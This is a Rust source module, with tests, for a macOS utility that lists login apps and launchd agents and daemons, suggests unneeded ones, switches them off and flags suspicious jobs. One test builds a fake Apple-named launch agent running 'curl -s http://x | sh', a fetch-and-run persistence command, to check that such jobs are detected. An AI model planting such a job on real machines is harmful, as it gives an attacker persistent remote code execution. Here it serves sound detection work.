//! What starts with the Mac: apps opened at login (System Events' list) and
//! launchd agents and daemons, with when each runs, whether it runs now,
//! which app it belongs to and whether it is likely not needed. Each can be
//! turned off without removing anything, and turned back on.

use super::sign::{self, Flag, Signer};
use crate::kit::{macos, plist};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

/// Which launchd folder a job comes from.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Default)]
pub enum Scope {
    /// ~/Library/LaunchAgents
    #[default]
    User,
    /// /Library/LaunchAgents: runs for every user, switchable per user
    AllUsers,
    /// /Library/LaunchDaemons: runs as root, needs the admin password
    System,
}

/// When launchd starts a job, from its plist.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
pub enum When {
    /// KeepAlive: started again whenever it stops.
    KeepsRunning,
    /// StartInterval, in seconds.
    Every(u64),
    /// StartCalendarInterval.
    Scheduled,
    /// RunAtLoad only.
    AtLogin,
    /// Only when something asks for it (a socket, a watched path, a Mach service).
    #[default]
    OnDemand,
}

impl When {
    pub fn label(self, scope: Scope) -> String {
        match self {
            When::KeepsRunning => "keeps running".into(),
            When::Every(s) => every(s),
            When::Scheduled => "on a schedule".into(),
            When::AtLogin if scope == Scope::System => "at startup".into(),
            When::AtLogin => "at login".into(),
            When::OnDemand => "on demand".into(),
        }
    }
}

/// "every hour", "every 5 min", "every 2 days".
pub fn every(secs: u64) -> String {
    let unit = |n: u64, one: &str, many: &str| if n == 1 { format!("every {one}") } else { format!("every {n} {many}") };
    match secs {
        0..=89 => unit(secs.max(1), "second", "s"),
        90..=3569 => unit((secs + 30) / 60, "minute", "min"),
        3570..=84_599 => unit((secs + 1800) / 3600, "hour", "h"),
        _ => unit((secs + 43_200) / 86_400, "day", "days"),
    }
}

/// Why a job is suggested to turn off.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Why {
    /// Its app is gone.
    Removed,
    /// It only checks for updates; the app updates itself when opened.
    Updater,
    /// Known not to be needed for the app to work.
    NotNeeded,
}

impl Why {
    pub fn short(self) -> &'static str {
        match self {
            Why::Removed => "app removed",
            Why::Updater => "updater",
            Why::NotNeeded => "not needed",
        }
    }
}

/// Jobs known to be safe to turn off, with a display name.
const KNOWN: &[(&str, &str, Why)] = &[
    ("com.valvesoftware.steamclean", "Steam Cleaner", Why::NotNeeded),
    ("com.google.GoogleUpdater.wake", "Google Updater", Why::Updater),
    ("com.google.keystone.agent", "Google Keystone", Why::Updater),
    ("com.google.keystone.xpcservice", "Google Keystone", Why::Updater),
    ("com.google.keystone.daemon", "Google Keystone", Why::Updater),
    ("com.adobe.ARMDCHelper.cc24aef4a1b90ed56a725c38014c95072f92651fb65e1bf9c8e43c37a23d420d", "Adobe Acrobat Updater", Why::Updater),
    ("com.adobe.AdobeCreativeCloud", "Creative Cloud", Why::NotNeeded),
    ("com.microsoft.update.agent", "Microsoft AutoUpdate", Why::Updater),
    ("com.microsoft.autoupdate.helper", "Microsoft AutoUpdate", Why::Updater),
    ("com.oracle.java.Java-Updater", "Java Updater", Why::Updater),
];

/// Never suggested: things that must run for the Mac or the app to work.
fn protected(label: &str) -> bool {
    let l = label.to_ascii_lowercase();
    l.starts_with("com.apple.") || l.starts_with("com.romanfurman6.") || l.contains("vpn") || l.contains("security") || l.contains("antivirus") || l.contains("backup")
}

#[derive(Clone, Debug, PartialEq, Default)]
pub struct Job {
    pub label: String,
    pub plist: PathBuf,
    pub program: Option<PathBuf>,
    /// The whole command line (ProgramArguments, else just the program).
    pub args: Vec<String>,
    /// Who signed what it runs; None until `codesign` has been asked.
    pub sig: Option<Signer>,
    /// What it runs, hashed: tells a changed job from the same one.
    pub fp: String,
    pub scope: Scope,
    pub on: bool,
    pub when: When,
    /// Its process id while it runs.
    pub pid: Option<u32>,
    /// Its program is gone: left behind by a removed app.
    pub orphan: bool,
    /// The app it belongs to (the outermost .app around its program).
    pub owner: Option<PathBuf>,
    pub name: String,
    /// Registered by its app from inside its bundle (SMAppService): it can
    /// be switched, but its file is part of the app and stays.
    pub bundled: bool,
}

impl Job {
    pub fn domain(&self) -> String {
        match self.scope {
            Scope::System => "system".into(),
            _ => format!("gui/{}", macos::uid()),
        }
    }
    pub fn key(&self) -> (String, Scope) {
        (self.label.clone(), self.scope)
    }
    pub fn admin(&self) -> bool {
        self.scope == Scope::System
    }
    pub fn why(&self) -> Option<Why> {
        if protected(&self.label) {
            return None;
        }
        if self.orphan {
            return Some(Why::Removed);
        }
        if let Some((_, _, w)) = KNOWN.iter().find(|(l, _, _)| *l == self.label) {
            return Some(*w);
        }
        let hay = format!("{} {}", self.label, self.program.as_ref().map(|p| p.to_string_lossy().into_owned()).unwrap_or_default()).to_ascii_lowercase();
        ["updater", "autoupdate", "update.agent", "update.check", "keystone", "softwareupdate"].iter().any(|k| hay.contains(k)).then_some(Why::Updater)
    }
    /// Suggested to turn off, and still on.
    pub fn suggested(&self) -> bool {
        self.on && self.why().is_some()
    }
    pub fn owner_name(&self) -> Option<String> {
        self.owner.as_ref().and_then(|o| o.file_stem()).map(|s| s.to_string_lossy().into_owned())
    }
    /// macOS's own: named com.apple.* and really Apple's (signed by Apple,
    /// or in a folder only Apple can write). Kept out of the list. One with
    /// the name but not the signature shows, flagged.
    pub fn apple(&self) -> bool {
        if !self.label.to_ascii_lowercase().starts_with("com.apple.") {
            return false;
        }
        let Some(p) = &self.program else { return true };
        // until its signature is read, it waits out of sight
        sign::apple_owned(p, &self.args, self.sig.as_ref())
    }
    pub fn flags(&self) -> Vec<Flag> {
        sign::flags(&self.label, self.program.as_deref(), &self.args, self.sig.as_ref())
    }
    /// The command line as one string, for the menu.
    pub fn command(&self) -> String {
        if self.args.is_empty() {
            return self.program.as_ref().map(|p| p.display().to_string()).unwrap_or_default();
        }
        self.args.iter().map(|a| if a.contains(' ') || a.is_empty() { format!("'{a}'") } else { a.clone() }).collect::<Vec<_>>().join(" ")
    }
    /// What VirusTotal should look up.
    pub fn vt_file(&self) -> Option<PathBuf> {
        self.program.as_ref().map(|p| sign::vt_subject(p, &self.args))
    }
}

/// A short hash of what a job runs.
pub fn fingerprint(program: Option<&Path>, args: &[String]) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(program.map(|p| p.to_string_lossy().into_owned()).unwrap_or_default().as_bytes());
    for a in args {
        h.update([0u8]);
        h.update(a.as_bytes());
    }
    h.finalize().iter().take(8).map(|b| format!("{b:02x}")).collect()
}

/// Program and full command line from a job plist.
fn program_of(v: &plist::Value, bundle: Option<&Path>) -> (Option<PathBuf>, Vec<String>) {
    let args: Vec<String> = match v.get("ProgramArguments") {
        Some(plist::Value::Array(a)) => a.iter().filter_map(|x| x.str()).map(str::to_string).collect(),
        _ => Vec::new(),
    };
    let program = match bundle {
        Some(app) => v.get_str("BundleProgram").map(|b| app.join(b)),
        None => None,
    }
    .or_else(|| v.get_str("Program").map(PathBuf::from))
    .or_else(|| args.first().map(PathBuf::from))
    .or_else(|| v.get_str("BundleProgram").map(PathBuf::from));
    (program, args)
}

/// An app macOS opens at login.
#[derive(Clone, Debug, PartialEq)]
pub struct LoginApp {
    pub name: String,
    pub path: PathBuf,
    pub hidden: bool,
    pub on: bool,
}

/// The outermost `.app` bundle that holds `program`.
pub fn owner_app(program: &Path) -> Option<PathBuf> {
    let mut out = None;
    let mut cur = PathBuf::new();
    for c in program.components() {
        cur.push(c);
        if cur.extension().is_some_and(|e| e == "app") {
            out = Some(cur.clone());
            break;
        }
    }
    out
}

/// "com.hnc.Discord" → "Discord", "us.zoom.updater.login.check" → "Check".
pub fn pretty_name(id: &str) -> String {
    let parts: Vec<&str> = id.split('.').collect();
    let pick = if parts.len() >= 3 { parts[parts.len() - 1] } else { parts.last().copied().unwrap_or(id) };
    let mut c = pick.chars();
    match c.next() {
        Some(f) => f.to_uppercase().chain(c).collect(),
        None => id.to_string(),
    }
}

/// A job's display name: a known name, its app's name, else from its label.
fn display_name(label: &str, owner: Option<&Path>) -> String {
    if let Some((_, n, _)) = KNOWN.iter().find(|(l, _, _)| *l == label) {
        return n.to_string();
    }
    if let Some(stem) = owner.and_then(|o| o.file_stem()) {
        return stem.to_string_lossy().into_owned();
    }
    pretty_name(label)
}

fn when_of(v: &plist::Value) -> When {
    match v.get("KeepAlive") {
        Some(plist::Value::Bool(true)) | Some(plist::Value::Dict(_)) => return When::KeepsRunning,
        _ => {}
    }
    if let Some(plist::Value::Num(n)) = v.get("StartInterval") {
        if let Ok(s) = n.trim().parse::<u64>() {
            return When::Every(s);
        }
    }
    if v.get("StartCalendarInterval").is_some() {
        return When::Scheduled;
    }
    if v.get_bool("RunAtLoad") == Some(true) {
        return When::AtLogin;
    }
    When::OnDemand
}

/// The launchd folders, with their scope, under a home Library and a system root.
pub fn dirs(user_library: &Path, system: &Path) -> [(PathBuf, Scope); 3] {
    [(user_library.join("LaunchAgents"), Scope::User), (system.join("Library/LaunchAgents"), Scope::AllUsers), (system.join("Library/LaunchDaemons"), Scope::System)]
}

/// launchd jobs of every scope, macOS's own left out.
pub fn jobs(user_library: &Path, system: &Path, disabled_user: &HashSet<String>, disabled_system: &HashSet<String>, pids: &HashMap<String, u32>) -> Vec<Job> {
    let mut out = Vec::new();
    for (dir, scope) in dirs(user_library, system) {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        let mut found: Vec<Job> = rd
            .flatten()
            .filter(|e| e.file_name().to_string_lossy().ends_with(".plist"))
            .filter_map(|e| {
                let path = e.path();
                let v = plist::read(&path)?;
                let label = v.get_str("Label")?.to_string();
                let (program, args) = program_of(&v, None);
                let orphan = program.as_ref().is_some_and(|p| p.is_absolute() && !crate::kit::fs::behind_folder_prompt(p) && p.symlink_metadata().is_err());
                let disabled = if scope == Scope::System { disabled_system } else { disabled_user };
                let on = !disabled.contains(&label) && v.get_bool("Disabled") != Some(true);
                let owner = program.as_deref().and_then(owner_app);
                let name = display_name(&label, owner.as_deref());
                let fp = fingerprint(program.as_deref(), &args);
                let sig = program.as_deref().and_then(|p| sign::known(p, &args));
                Some(Job { pid: if on { pids.get(&label).copied() } else { None }, when: when_of(&v), label, plist: path, program, args, sig, fp, scope, on, orphan, owner, name, bundled: false })
            })
            .collect();
        found.sort_by_key(|j| j.name.to_lowercase());
        out.extend(found);
    }
    out
}

/// Labels `launchctl print-disabled <domain>` reports as disabled.
pub fn parse_disabled(out: &str) -> HashSet<String> {
    out.lines()
        .filter_map(|l| {
            let (k, v) = l.split_once("=>")?;
            let v = v.trim();
            (v == "disabled" || v == "true").then(|| k.trim().trim_matches('"').to_string())
        })
        .collect()
}

/// Running jobs from `launchctl list` ("PID\tStatus\tLabel", "-" when not running).
pub fn parse_list(out: &str) -> HashMap<String, u32> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.split_whitespace();
            let pid = it.next()?.parse::<u32>().ok()?;
            let _status = it.next()?;
            let label = it.next()?;
            (pid > 0).then(|| (label.to_string(), pid))
        })
        .collect()
}

/// Every job `launchctl list` knows, running or not.
pub fn parse_list_loaded(out: &str) -> HashSet<String> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.split_whitespace();
            let pid = it.next()?;
            let _status = it.next()?;
            let label = it.next()?;
            (pid == "-" || pid.parse::<u32>().is_ok()).then(|| label.to_string())
        })
        .collect()
}

/// Every job in the `services = { … }` block of `launchctl print system`.
pub fn parse_print_loaded(out: &str) -> HashSet<String> {
    let mut inside = false;
    let mut found = HashSet::new();
    for l in out.lines() {
        let t = l.trim();
        if !inside {
            inside = t.starts_with("services = {");
            continue;
        }
        if t == "}" {
            break;
        }
        let parts: Vec<&str> = t.split_whitespace().collect();
        if parts.len() >= 3 && (parts[0] == "-" || parts[0].parse::<u32>().is_ok()) {
            found.insert(parts[parts.len() - 1].to_string());
        }
    }
    found
}

/// What launchd knows about, per domain: loaded and switched-off labels.
pub struct Known<'a> {
    pub loaded_user: &'a HashSet<String>,
    pub loaded_system: &'a HashSet<String>,
    pub disabled_user: &'a HashSet<String>,
    pub disabled_system: &'a HashSet<String>,
    pub pids: &'a HashMap<String, u32>,
}

/// Agents and daemons apps register from inside their own bundle
/// (`Contents/Library/LaunchAgents|LaunchDaemons`, SMAppService). They never
/// appear in the launchd folders; a plist counts once launchd has it loaded
/// or someone switched it off.
pub fn bundled_jobs(apps: &[PathBuf], k: &Known) -> Vec<Job> {
    let mut out = Vec::new();
    for app in apps {
        for (sub, scope) in [("Contents/Library/LaunchAgents", Scope::User), ("Contents/Library/LaunchDaemons", Scope::System)] {
            let Ok(rd) = std::fs::read_dir(app.join(sub)) else { continue };
            for e in rd.flatten() {
                let path = e.path();
                if path.extension().is_none_or(|x| x != "plist") {
                    continue;
                }
                let Some(v) = plist::read(&path) else { continue };
                let Some(label) = v.get_str("Label").map(str::to_string) else { continue };
                let (loaded, disabled) = if scope == Scope::System { (k.loaded_system, k.disabled_system) } else { (k.loaded_user, k.disabled_user) };
                if !(loaded.contains(&label) || disabled.contains(&label)) {
                    continue;
                }
                let (program, args) = program_of(&v, Some(app));
                let on = !disabled.contains(&label) && v.get_bool("Disabled") != Some(true);
                let owner = Some(app.clone());
                let name = display_name(&label, owner.as_deref());
                let fp = fingerprint(program.as_deref(), &args);
                let sig = program.as_deref().and_then(|p| sign::known(p, &args));
                out.push(Job { pid: if on { k.pids.get(&label).copied() } else { None }, when: when_of(&v), label, plist: path, program, args, sig, fp, scope, on, orphan: false, owner, name, bundled: true });
            }
        }
    }
    out.sort_by_key(|j| j.name.to_lowercase());
    out
}

/// Apps in the usual folders (and one level of subfolders), for bundled jobs.
fn app_bundles(user_home: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for root in [PathBuf::from("/Applications"), user_home.join("Applications")] {
        let Ok(rd) = std::fs::read_dir(&root) else { continue };
        for e in rd.flatten() {
            let p = e.path();
            if p.extension().is_some_and(|x| x == "app") {
                out.push(p);
            } else if p.is_dir() && !p.is_symlink() {
                if let Ok(inner) = std::fs::read_dir(&p) {
                    out.extend(inner.flatten().map(|e| e.path()).filter(|q| q.extension().is_some_and(|x| x == "app")));
                }
            }
        }
    }
    out
}

/// Running jobs from the `services = { … }` block of `launchctl print system`
/// (each line "PID  last-exit  label", PID 0 or "-" when not running).
pub fn parse_print_services(out: &str) -> HashMap<String, u32> {
    let mut inside = false;
    let mut found = HashMap::new();
    for l in out.lines() {
        let t = l.trim();
        if !inside {
            inside = t.starts_with("services = {");
            continue;
        }
        if t == "}" {
            break;
        }
        let parts: Vec<&str> = t.split_whitespace().collect();
        if parts.len() >= 3 {
            if let Ok(pid) = parts[0].parse::<u32>() {
                if pid > 0 {
                    found.insert(parts[parts.len() - 1].to_string(), pid);
                }
            }
        }
    }
    found
}

fn run(args: &[&str]) -> String {
    std::process::Command::new("/bin/launchctl").args(args).output().map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default()
}

/// Leave out macOS's own jobs.
pub fn shown(mut jobs: Vec<Job>) -> Vec<Job> {
    jobs.retain(|j| !j.apple());
    jobs
}

/// Jobs whose signature hasn't been read yet.
pub fn unsigned_yet(jobs: &[Job]) -> bool {
    jobs.iter().any(|j| j.sig.is_none() && j.program.is_some())
}

/// Read the signatures not read yet (runs `codesign`; slow).
pub fn sign_jobs(jobs: &mut [Job]) {
    let todo: Vec<(PathBuf, Vec<String>)> = jobs.iter().filter(|j| j.sig.is_none()).filter_map(|j| Some((j.program.clone()?, j.args.clone()))).collect();
    sign::check_all(&todo);
    for j in jobs.iter_mut().filter(|j| j.sig.is_none()) {
        if let Some(p) = &j.program {
            j.sig = sign::known(p, &j.args);
        }
    }
}

/// Every job, macOS's own included (they're sorted out once signed).
pub fn read_raw(user_library: &Path) -> Vec<Job> {
    let gui = format!("gui/{}", macos::uid());
    let du = parse_disabled(&run(&["print-disabled", &gui]));
    let ds = parse_disabled(&run(&["print-disabled", "system"]));
    let sys = run(&["print", "system"]);
    let list = run(&["list"]);
    let mut pids = parse_print_services(&sys);
    pids.extend(parse_list(&list));
    let mut out = jobs(user_library, Path::new("/"), &du, &ds, &pids);
    let (lu, ls) = (parse_list_loaded(&list), parse_print_loaded(&sys));
    let home = user_library.parent().unwrap_or(Path::new("/"));
    let bundled = bundled_jobs(&app_bundles(home), &Known { loaded_user: &lu, loaded_system: &ls, disabled_user: &du, disabled_system: &ds, pids: &pids });
    // a label already in a launchd folder is that job, not a second one
    let fresh: Vec<Job> = bundled.into_iter().filter(|b| !out.iter().any(|j| j.label == b.label && (j.scope == Scope::System) == (b.scope == Scope::System))).collect();
    out.extend(fresh);
    out
}

/// The shell command that turns a job on or off; it stays switched across restarts.
pub fn switch_cmd(job: &Job, on: bool) -> String {
    let target = macos::sh_quote(&format!("{}/{}", job.domain(), job.label));
    let plist = macos::sh_quote(&job.plist.to_string_lossy());
    if on {
        format!("/bin/launchctl enable {target}; /bin/launchctl bootstrap {d} {plist} 2>/dev/null; ", d = job.domain())
    } else {
        format!("/bin/launchctl disable {target}; /bin/launchctl bootout {target} 2>/dev/null; ")
    }
}

/// Turn several jobs on or off: one password prompt for all the admin ones.
pub fn set_jobs(jobs: &[(Job, bool)]) -> Result<(), String> {
    let (admin, user): (Vec<_>, Vec<_>) = jobs.iter().partition(|(j, _)| j.admin());
    if !user.is_empty() {
        let cmd: String = user.iter().map(|(j, on)| switch_cmd(j, *on)).collect::<String>() + "true";
        let o = std::process::Command::new("/bin/sh").arg("-c").arg(&cmd).output().map_err(|e| e.to_string())?;
        if !o.status.success() {
            return Err(String::from_utf8_lossy(&o.stderr).trim().to_string());
        }
    }
    if !admin.is_empty() {
        let cmd: String = admin.iter().map(|(j, on)| switch_cmd(j, *on)).collect::<String>() + "true";
        macos::run_admin(&cmd, "Cmd+Meow wants to change what starts with your Mac.")?;
    }
    Ok(())
}

/// Stop a job and move its plist to the Trash (for agents of removed apps).
pub fn trash_job(job: &Job) -> Result<(), String> {
    let target = macos::sh_quote(&format!("{}/{}", job.domain(), job.label));
    if job.admin() {
        let trash = crate::kit::fs::home().join(".Trash");
        let name = job.plist.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        let mut dest = trash.join(&name);
        let mut k = 1;
        while dest.symlink_metadata().is_ok() {
            dest = trash.join(format!("{k} {name}"));
            k += 1;
        }
        let cmd = format!(
            "/bin/launchctl bootout {target} 2>/dev/null; /bin/mv -n {src} {dst} && /usr/sbin/chown {uid} {dst}",
            src = macos::sh_quote(&job.plist.to_string_lossy()),
            dst = macos::sh_quote(&dest.to_string_lossy()),
            uid = macos::uid()
        );
        macos::run_admin(&cmd, "Cmd+Meow wants to move a leftover startup item to your Trash.").map(|_| ())
    } else {
        let _ = std::process::Command::new("/bin/sh").arg("-c").arg(format!("/bin/launchctl bootout {target} 2>/dev/null; true")).output();
        crate::kit::fs::move_to_trash(&job.plist)
    }
}

/// Apps opened at login. macOS asks once to let us read them.
pub fn login_apps() -> Result<Vec<LoginApp>, String> {
    let script = r#"set out to ""
tell application "System Events"
repeat with li in every login item
set out to out & (name of li) & tab & (path of li) & tab & (hidden of li) & linefeed
end repeat
end tell
return out"#;
    Ok(parse_login_apps(&macos::osascript(script)?))
}

pub fn parse_login_apps(out: &str) -> Vec<LoginApp> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.split('\t');
            let name = it.next()?.trim().to_string();
            let path = PathBuf::from(it.next()?.trim());
            let hidden = it.next().is_some_and(|h| h.trim() == "true");
            (!name.is_empty()).then_some(LoginApp { name, path, hidden, on: true })
        })
        .collect()
}

/// Add or remove an app from the login list.
pub fn set_login_app(app: &LoginApp, on: bool) -> Result<(), String> {
    let script = if on {
        format!("tell application \"System Events\" to make login item at end with properties {{path:{}, hidden:{}}}", macos::as_quote(&app.path.to_string_lossy()), app.hidden)
    } else {
        format!("tell application \"System Events\" to delete login item {}", macos::as_quote(&app.name))
    };
    macos::osascript(&script).map(|_| ())
}

/// System Settings › General › Login Items.
pub fn open_settings() {
    macos::open("x-apple.systempreferences:com.apple.LoginItems-Settings.extension");
}

#[cfg(test)]
pub mod tests {
    use super::*;

    pub struct Fake {
        pub root: PathBuf,
        pub home_lib: PathBuf,
        pub sys: PathBuf,
    }

    impl Fake {
        pub fn new(tag: &str) -> Fake {
            let root = std::env::temp_dir().join(format!("cmb-startup-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&root);
            let f = Fake { home_lib: root.join("home/Library"), sys: root.join("sys"), root };
            std::fs::create_dir_all(&f.home_lib).unwrap();
            f
        }
        pub fn file(&self, rel: &str, body: &str) -> PathBuf {
            let p = self.root.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, body).unwrap();
            p
        }
    }

    impl Drop for Fake {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    pub fn job_xml(label: &str, prog: &str, extra: &str) -> String {
        format!("<plist><dict><key>Label</key><string>{label}</string><key>ProgramArguments</key><array><string>{prog}</string></array>{extra}</dict></plist>")
    }

    #[test]
    fn reads_jobs_and_their_state() {
        let f = Fake::new("read");
        f.file("home/Library/LaunchAgents/com.google.GoogleUpdater.wake.plist", &job_xml("com.google.GoogleUpdater.wake", "/bin/sh", "<key>StartInterval</key><integer>3600</integer>"));
        f.file("home/Library/LaunchAgents/com.gone.agent.plist", &job_xml("com.gone.agent", "/nope/Gone.app/Contents/MacOS/agent", "<key>RunAtLoad</key><true/>"));
        f.file("home/Library/LaunchAgents/com.off.agent.plist", &job_xml("com.off.agent", "/bin/sh", "<key>Disabled</key><true/>"));
        f.file("home/Library/LaunchAgents/com.apple.x.plist", &job_xml("com.apple.x", "/usr/libexec/x", ""));
        f.file("sys/Library/LaunchDaemons/com.docker.vmnetd.plist", &job_xml("com.docker.vmnetd", "/bin/sh", "<key>KeepAlive</key><true/>"));
        f.file("sys/Library/LaunchAgents/com.ms.update.plist", &job_xml("com.ms.update", "/bin/sh", "<key>StartCalendarInterval</key><dict><key>Hour</key><integer>3</integer></dict>"));
        let du: HashSet<String> = ["com.off.agent".to_string()].into();
        let pids: HashMap<String, u32> = [("com.docker.vmnetd".to_string(), 77), ("com.off.agent".to_string(), 5)].into();
        let js = jobs(&f.home_lib, &f.sys, &du, &HashSet::new(), &pids);
        let find = |l: &str| js.iter().find(|j| j.label == l).unwrap();
        assert_eq!(js.len(), 6);
        // Apple's own: kept out once its program is known to be Apple's (SIP folder here)
        assert!(find("com.apple.x").apple());
        assert_eq!(shown(js.clone()).len(), 5);
        let g = find("com.google.GoogleUpdater.wake");
        assert_eq!((g.when, g.name.as_str(), g.why()), (When::Every(3600), "Google Updater", Some(Why::Updater)));
        let gone = find("com.gone.agent");
        assert!(gone.orphan && gone.when == When::AtLogin && gone.why() == Some(Why::Removed));
        assert_eq!(gone.owner, Some(PathBuf::from("/nope/Gone.app")));
        assert_eq!(gone.name, "Gone");
        let off = find("com.off.agent");
        assert!(!off.on && off.pid.is_none() && !off.suggested());
        let d = find("com.docker.vmnetd");
        assert_eq!((d.scope, d.when, d.pid, d.why()), (Scope::System, When::KeepsRunning, Some(77), None));
        let ms = find("com.ms.update");
        assert_eq!((ms.scope, ms.when), (Scope::AllUsers, When::Scheduled));
    }

    #[test]
    fn finds_jobs_apps_register_from_their_bundle() {
        let f = Fake::new("bundled");
        let xml = |label: &str, extra: &str| format!("<plist><dict><key>Label</key><string>{label}</string><key>BundleProgram</key><string>Contents/MacOS/helper</string>{extra}</dict></plist>");
        f.file("apps/Tool.app/Contents/Library/LaunchAgents/com.tool.agent.plist", &xml("com.tool.agent", "<key>RunAtLoad</key><true/>"));
        f.file("apps/Tool.app/Contents/Library/LaunchDaemons/com.tool.daemon.plist", &xml("com.tool.daemon", "<key>KeepAlive</key><true/>"));
        f.file("apps/Tool.app/Contents/Library/LaunchAgents/com.tool.unused.plist", &xml("com.tool.unused", ""));
        f.file("apps/Off.app/Contents/Library/LaunchAgents/com.off.agent.plist", &xml("com.off.agent", ""));
        let apps = vec![f.root.join("apps/Tool.app"), f.root.join("apps/Off.app"), f.root.join("apps/None.app")];
        let lu: HashSet<String> = ["com.tool.agent".to_string()].into();
        let ls: HashSet<String> = ["com.tool.daemon".to_string()].into();
        let du: HashSet<String> = ["com.off.agent".to_string()].into();
        let pids: HashMap<String, u32> = [("com.tool.daemon".to_string(), 42)].into();
        let js = bundled_jobs(&apps, &Known { loaded_user: &lu, loaded_system: &ls, disabled_user: &du, disabled_system: &HashSet::new(), pids: &pids });
        let labels: Vec<&str> = js.iter().map(|j| j.label.as_str()).collect();
        // registered (loaded or switched off) ones only, never a plist launchd doesn't know
        assert_eq!(js.len(), 3, "{labels:?}");
        let find = |l: &str| js.iter().find(|j| j.label == l).unwrap();
        let a = find("com.tool.agent");
        assert!(a.bundled && a.on && a.scope == Scope::User && a.when == When::AtLogin);
        assert_eq!(a.program, Some(f.root.join("apps/Tool.app/Contents/MacOS/helper")));
        assert_eq!((a.name.as_str(), a.owner.clone()), ("Tool", Some(f.root.join("apps/Tool.app"))));
        let d = find("com.tool.daemon");
        assert_eq!((d.scope, d.pid, d.when), (Scope::System, Some(42), When::KeepsRunning));
        assert!(!find("com.off.agent").on);
    }

    #[test]
    fn keeps_the_command_and_spots_fake_apple_jobs() {
        let f = Fake::new("cmd");
        f.file("home/Library/LaunchAgents/com.apple.updated.plist", &format!("<plist><dict><key>Label</key><string>com.apple.updated</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://x | sh</string></array></dict></plist>"));
        let js = jobs(&f.home_lib, &f.sys, &HashSet::new(), &HashSet::new(), &HashMap::new());
        let mut j = js[0].clone();
        assert_eq!(j.args, vec!["/bin/sh", "-c", "curl -s http://x | sh"]);
        assert_eq!(j.command(), "/bin/sh -c 'curl -s http://x | sh'");
        // /bin/sh is Apple's, but this job hands it code inline: shown, flagged
        j.sig = Some(Signer::Apple);
        assert!(!j.apple());
        assert_eq!(j.flags(), vec![Flag::FakeApple, Flag::InlineCode]);
        j.args = vec![];
        j.program = Some(PathBuf::from("/Applications/Xcode.app/Contents/MacOS/x"));
        j.sig = None;
        assert!(j.apple(), "hidden until signed");
        // the same name on someone else's program shows, flagged
        j.program = Some(PathBuf::from("/Users/Shared/u"));
        j.args = vec![];
        j.sig = Some(Signer::Unsigned);
        assert!(!j.apple());
        assert_eq!(j.flags(), vec![Flag::FakeApple, Flag::Unsigned, Flag::TempFolder]);
        // the fingerprint follows what runs
        let a = fingerprint(Some(Path::new("/bin/x")), &["/bin/x".into(), "-a".into()]);
        assert_eq!(a, fingerprint(Some(Path::new("/bin/x")), &["/bin/x".into(), "-a".into()]));
        assert_ne!(a, fingerprint(Some(Path::new("/bin/x")), &["/bin/x".into(), "-b".into()]));
        assert_eq!(a.len(), 16);
    }

    #[test]
    fn lists_loaded_jobs_running_or_not() {
        let l = parse_list_loaded("PID\tStatus\tLabel\n123\t0\tcom.a\n-\t0\tcom.b\n");
        assert_eq!(l, ["com.a".to_string(), "com.b".to_string()].into());
        let p = parse_print_loaded("system = {\n\tservices = {\n\t\t 0\t-\tcom.c\n\t\t 88\t0\tcom.d\n\t}\n}");
        assert_eq!(p, ["com.c".to_string(), "com.d".to_string()].into());
    }

    #[test]
    fn suggestions_skip_protected_jobs() {
        let mut j = Job { label: "com.acme.vpn.updater".into(), on: true, when: When::AtLogin, ..Default::default() };
        assert_eq!(j.why(), None);
        j.label = "com.acme.updater".into();
        assert_eq!(j.why(), Some(Why::Updater));
        j.label = "com.valvesoftware.steamclean".into();
        assert_eq!(j.why(), Some(Why::NotNeeded));
        j.label = "com.romanfurman6.cleanmebro.fanhelper".into();
        j.orphan = true;
        assert_eq!(j.why(), None);
    }

    #[test]
    fn parses_tool_output() {
        let d = parse_disabled("disabled services = {\n\t\"com.a.b\" => disabled\n\t\"com.c.d\" => enabled\n\t\"com.e.f\" => true\n}\n");
        assert!(d.contains("com.a.b") && d.contains("com.e.f") && !d.contains("com.c.d"));
        let l = parse_list("PID\tStatus\tLabel\n-\t0\tcom.a.idle\n412\t0\tcom.b.running\n0\t0\tcom.c.zero\n");
        assert_eq!(l.len(), 1);
        assert_eq!(l.get("com.b.running"), Some(&412));
        let s = parse_print_services("system = {\n\tservices = {\n\t\t     123      0 \tcom.docker.vmnetd\n\t\t       0      -  \tcom.x.idle\n\t}\n\tother = 1\n}\n");
        assert_eq!(s.len(), 1);
        assert_eq!(s.get("com.docker.vmnetd"), Some(&123));
        let apps = parse_login_apps("Slack\t/Applications/Slack.app\ttrue\nSpotify\t/Applications/Spotify.app\tfalse\n\n");
        assert_eq!(apps.len(), 2);
        assert!(apps[0].hidden && !apps[1].hidden);
    }

    #[test]
    fn schedule_words() {
        assert_eq!(every(3600), "every hour");
        assert_eq!(every(300), "every 5 min");
        assert_eq!(every(7200), "every 2 h");
        assert_eq!(every(86400), "every day");
        assert_eq!(When::AtLogin.label(Scope::System), "at startup");
        assert_eq!(owner_app(Path::new("/Applications/Zoom.app/Contents/Frameworks/ZoomUpdater.app/Contents/MacOS/ZoomUpdater")), Some(PathBuf::from("/Applications/Zoom.app")));
        assert_eq!(owner_app(Path::new("/usr/local/bin/x")), None);
    }

    #[test]
    fn switch_commands() {
        let j = Job { label: "com.a.b".into(), plist: "/L/com.a.b.plist".into(), scope: Scope::System, on: true, when: When::AtLogin, name: "B".into(), ..Default::default() };
        assert_eq!(switch_cmd(&j, false), "/bin/launchctl disable 'system/com.a.b'; /bin/launchctl bootout 'system/com.a.b' 2>/dev/null; ");
        assert_eq!(switch_cmd(&j, true), "/bin/launchctl enable 'system/com.a.b'; /bin/launchctl bootstrap system '/L/com.a.b.plist' 2>/dev/null; ");
    }
}
